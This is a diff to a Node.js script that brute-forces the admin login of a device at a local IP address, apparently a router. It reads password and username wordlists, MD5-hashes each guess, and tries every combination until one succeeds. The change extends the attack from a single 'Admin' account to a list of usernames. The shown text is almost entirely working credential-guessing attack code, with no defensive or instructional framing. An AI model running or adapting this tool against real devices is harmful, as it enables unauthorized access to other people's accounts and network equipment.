@@ -34,6 +34,7 @@ const fs = require('fs');
 
 const host = '192.168.11.1';  // change it
 const filePasswords = 'passwords.txt'; // put words top to down, one per line
+const fileUsers = 'users.txt'; // to don't use this, put 'null'
 
 function hex_md5(s) { return rstr2hex(rstr_md5(str2rstr_utf8(s))); }
 function b64_md5(s) { return rstr2b64(rstr_md5(str2rstr_utf8(s))); }
@@ -309,8 +310,8 @@ function bit_rol(num, cnt)
   return (num << cnt) | (num >>> (32 - cnt));
 }
 
-async function tryLogin(password) {
-	const username = "Admin";
+async function tryLogin(password, user="Admin") {
+	const username = user;
 	const pass = password;
 	password = hex_md5(pass);
 
@@ -346,22 +347,37 @@ async function tryLogin(password) {
 	}
 }
 
-async function crack(listWords) {
-for (let pass of listWords) {
-    const login = await tryLogin(pass);
-    
-    if (login[0]) {
-      console.log(`\nSuccessfuly login with: [${login[1]}]@[${login[2]}]\n`);
-      break;
-    } else {
-      console.log(`Invalid Credentials: [${login[1]}]@[${login[2]}]`);
-    }
-  }
+async function crack(passwords, users=['Admin']) {
+	let done = false;
+	for (let user of users) {
+		if (!done) {
+			for (let pass of passwords) {
+		    const login = await tryLogin(pass, user);
+		    
+		    if (login[0]) {
+		      console.log(`\nSuccessfuly login with: [${login[1]}]@[${login[2]}]\n`);
+		      done = true;
+		      break;
+		    } else {
+		      console.log(`Invalid Credentials: [${login[1]}]@[${login[2]}]`);
+		    }
+		  }
+		} else {
+			break;
+		}
+	}
 }
 
-fs.readFile(filePasswords, 'utf-8', (a, b) => {
-  const passwords = [...b.split('\r\n')]; // '\r\n' for windows, if is linux, change to '\n'
-  
-  crack(passwords);
+fs.readFile(filePasswords, 'utf-8', (_, lt) => {
+	let passwords, users;
+  passwords = [...lt.split('\r\n')]; // '\r\n' for windows, if is linux, change to '\n'
+  if (fileUsers !== null) {
+  	fs.readFile(fileUsers, 'utf-8', (_, lb) => {
+  		users = [...lb.split('\r\n')]; // '\r\n' for windows, if is linux, change to '\n'
+  		return crack(passwords, users);
+  	})
+  } else {
+  	return crack(passwords);
+  }
 })
 
